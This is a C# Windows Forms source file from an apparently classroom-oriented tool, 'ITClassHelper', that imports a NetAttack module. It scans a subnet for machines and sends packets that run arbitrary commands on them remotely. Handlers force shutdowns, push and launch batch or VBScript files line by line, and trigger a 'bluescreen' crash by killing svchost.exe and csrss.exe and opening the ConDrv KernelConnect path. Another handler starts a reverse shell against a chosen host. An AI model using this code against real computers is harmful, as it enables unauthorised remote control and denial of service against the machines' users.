using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static ITClassHelper.ProcMgr;
using static ITClassHelper.NetAttack;
using static ITClassHelper.Shared;

namespace ITClassHelper
{
    public partial class FormDeviceManage : Form
    {
        public FormDeviceManage() => InitializeComponent();

        private void ScanButton_Click(object sender, EventArgs e)
        {
            int rangeStart = int.Parse(IPTextBox.Text.Split('.')[3]);
            int rangeEnd = int.Parse(IPRangeTextBox.Text);
            string ipStart = IPTextBox.Text;
            if (rangeEnd - rangeStart + 1 >= 5)
            {
                if (MessageBox.Show("扫描数量大于或等于 10 个，扫描速度可能较慢！\n按[确定]继续扫描；\n按[取消]放弃扫描。", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.Cancel)
                    return;
            }
            DeviceList.Items.Clear();
            ScanButton.Text = "扫描中！"; ScanButton.Enabled = false; Cursor = Cursors.WaitCursor;
            new Thread(x =>
            {
                for (int i = rangeStart; i <= rangeEnd; i++)
                {
                    Ping ping = new Ping();
                    PingReply reply;
                    try
                    {
                        reply = ping.Send($"{ipStart.Substring(0, ipStart.Length - (rangeStart.ToString().Length + 1))}.{i}", 1000);
                    }
                    catch (PingException) { continue; }
                    if (reply.Status == IPStatus.Success)
                    {
                        string ip = reply.Address.ToString();
                        DeviceList.Items.Add(ip);
                        if (DisableMacAddressCheckBox.Checked == false)
                        {
                            string mac = Network.GetMacByIP(ip);
                            if (mac != "00-00-00-00-00-00")
                                DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(mac);
                            else
                                DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add("");
                        }
                        else
                            DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add("");
                        if (DisableHostNameCheckBox.Checked == false)
                        {
                            try
                            {
                                string hostName = Network.GetHostName(ip);
                                if (hostName != reply.Address.ToString() && hostName != "ERROR")
                                    DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(hostName);
                                else
                                    DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add("");
                            }
                            catch (SocketException) { DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add(""); }
                        }
                        else
                            DeviceList.Items[DeviceList.Items.Count - 1].SubItems.Add("");
                    }
                }
                ScanButton.Text = "扫描"; ScanButton.Enabled = true; Cursor = Cursors.Default;
            })
            { IsBackground = true }.Start();
        }

        private string[] GetSelectedIPs()
        {
            string[] ips = new string[DeviceList.SelectedItems.Count];
            for (int i = 0; i <= DeviceList.SelectedItems.Count - 1; i++)
                ips[i] = DeviceList.SelectedItems[i].Text;
            return ips;
        }

        private void SendCmdMenuItem_Click(object sender, EventArgs e)
        {
            string command = Interaction.InputBox("请输入要发送的命令：", "信息");
            SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
        }

        private void SendMsgMenuItem_Click(object sender, EventArgs e)
        {
            string message = Interaction.InputBox("请输入要发送的消息：", "信息");
            string msgMethod = Interaction.InputBox("请选择发送模式：\n1：原生方法+远程显示（稳定、不引人注意）\n2：原生方法+本地发送（较不稳定、不引人注意）\n3：自带方法+本地发送（只有安装了本软件才可使用此方法）", "信息");
            switch (msgMethod)
            {
                case "1":
                    SendPack($"msg * {message}", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                    break;

                case "2":
                    foreach (string ip in GetSelectedIPs())
                        Run("msg", $"/server:{Network.GetHostName(ip)} * {message}");
                    break;

                case "3":
                    try
                    {
                        if (Network.socketBound == false)
                            Network.socket.Bind(new IPEndPoint(IPAddress.Parse(Network.GetIPAddress()), 6666));
                        Network.socketBound = true;
                    }
                    catch (SocketException ex)
                    {
                        MessageBox.Show($"本机 IP 地址绑定失败！\n错因：{ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(Interaction.InputBox("请输入要发送的消息：", "信息"));
                    foreach (string ip in GetSelectedIPs())
                    {
                        EndPoint clientPoint = new IPEndPoint(IPAddress.Parse(ip), 6666);
                        try
                        { Network.socket.SendTo(bytes, clientPoint); }
                        catch (SocketException ex)
                        {
                            MessageBox.Show($"发送消息失败！\n错因：{ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    break;

                default:
                    break;
            }
        }

        private void SendScriptMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openScriptDialog = new OpenFileDialog
            {
                Multiselect = false,
                Title = "选择脚本文件",
                Filter = "批处理文件(*.bat)|*.bat|Visual Basic 脚本(*.vbs)|*.vbs"
            };
            string openScriptPath = openScriptDialog.FileName;
            string scriptName = openScriptPath.Substring(openScriptPath.LastIndexOf('\\') + 1);
            if (openScriptDialog.ShowDialog() == DialogResult.OK)
            {
                int lineCnt = 0;
                using (FileStream lineFs = new FileStream(openScriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
                {
                    using (StreamReader lineSr = new StreamReader(lineFs))
                    {
                        while (lineSr.ReadLine() != null)
                            lineCnt++;
                    }
                }

                List<string> newLines = new List<string>(lineCnt + 2);
                using (StreamReader sr = new StreamReader(openScriptPath))
                {
                    newLines.Add($@"del /f /q C:\{scriptName}");
                    string line, newLine = "";
                    while ((line = sr.ReadLine()) != null)
                    {
                        newLine = "echo ";
                        foreach (char ch in line)
                        {
                            if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'))
                                newLine += ch;
                            else
                                newLine += "^" + ch;
                        }
                        newLine += $@" >> C:\{scriptName}";
                        newLines.Add(newLine);
                    }
                    newLines.Add($@"start C:\{scriptName}");
                }

                new Thread(x =>
                {
                    foreach (string line in newLines)
                    {
                        SendPack(line, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                        Thread.Sleep(1000);
                    }

                })
                { IsBackground = true }.Start();
            }
        }

        private void ScripterMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openScriptDialog = new OpenFileDialog
            {
                Multiselect = false,
                Title = "选择脚本文件",
                Filter = "批处理文件(*.bat)|*.bat|Visual Basic 脚本(*.vbs)|*.vbs"
            };
            string openScriptPath = openScriptDialog.FileName;
            string scriptName = openScriptPath.Substring(openScriptPath.LastIndexOf('\\') + 1);
            if (openScriptDialog.ShowDialog() == DialogResult.OK)
            {
                int lineCnt = 0;
                using (FileStream lineFs = new FileStream(openScriptPath, FileMode.OpenOrCreate, FileAccess.ReadWrite))
                {
                    using (StreamReader lineSr = new StreamReader(lineFs))
                    {
                        while (lineSr.ReadLine() != null)
                            lineCnt++;
                    }
                }

                List<string> newLines = new List<string>(lineCnt + 2);
                using (StreamReader sr = new StreamReader(openScriptPath))
                {
                    newLines.Add($@"del /f /q C:\{scriptName}");
                    string line, newLine = "";
                    while ((line = sr.ReadLine()) != null)
                    {
                        newLine = "echo ";
                        foreach (char ch in line)
                        {
                            if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z'))
                                newLine += ch;
                            else
                                newLine += "^" + ch;
                        }
                        newLine += $@" >> C:\{scriptName}";
                        newLines.Add(newLine);
                    }
                    newLines.Add($@"start C:\{scriptName}");
                }

                new Thread(x =>
                {
                    foreach (string line in newLines)
                    {
                        SendPack(line, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                        Thread.Sleep(1000);
                    }
                    
                }) { IsBackground = true }.Start();
            }
        }

        private void ShutdownMenuItem_Click(object sender, EventArgs e)
        {
            ShutdownSender("shutdown");
        }

        private void RebootMenuItem_Click(object sender, EventArgs e)
        {
            ShutdownSender("reboot");
        }

        private void ShutdownSender(string shutdownType)
        {
            string shutdownMethod;
            if (shutdownType == "shutdown")
                shutdownMethod = Interaction.InputBox("请选择关机模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）", "信息");
            else
                shutdownMethod = Interaction.InputBox("请选择重启模式：\n1：原生方法+本地发送（较不稳定）\n2：原生方法+本地发送（较稳定、可自定义）\n3：教室方法+本地发送（稳定）", "信息");
            switch (shutdownMethod.Trim())
            {
                case "1":
                    foreach (string ip in GetSelectedIPs())
                    {
                        if (shutdownType == "shutdown")
                            Run("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /s /t 0");
                        else
                            Run("shutdown", $"/m \\\\{Dns.GetHostEntry(ip).HostName} /r /t 0");
                    }
                    break;

                case "2":
                    Run("shutdown", "/i", true);
                    break;

                case "3":
                    SendPack("shutdown /s /t 0", GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
                    break;

                default:
                    break;
            }
        }

        private void ConvertHostNameIPButton_Click(object sender, EventArgs e)
        {
            string result;
            result = Network.GetIPAddress(HostNameTextBox.Text);
            if (result != "ERROR")
                MessageBox.Show($"目标 IP 地址为：{result}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else
                MessageBox.Show("找不到此计算机！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void IPButton_Click(object sender, EventArgs e)
        {
            string result;
            result = Network.GetIPAddress();
            if (result != "ERROR")
                MessageBox.Show($"本机 IP 地址为：{result}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else
                MessageBox.Show("本机 IP 地址获取失败！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void BluescreenMenuItem_Click(object sender, EventArgs e)
        {
            string[] commands = new string[4]
            {
                "powershell wininit",
                "iexplore file://./GlobalRoot/Device/ConDrv/KernelConnect",
                "taskkill /f /im svchost.exe",
                "taskkill /f /im csrss.exe"
            };
            foreach (string command in commands)
                SendPack(command, GetSelectedIPs(), int.Parse(PortTextBox.Text), roomType);
        }

        private void RevShellMenuItem_Click(object sender, EventArgs e)
        {
            Run(Process.GetCurrentProcess().MainModule.FileName, $"-rs {GetSelectedIPs()[0]}", true);
        }

        private void FormDeviceManage_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Hide();
        }
    }
}
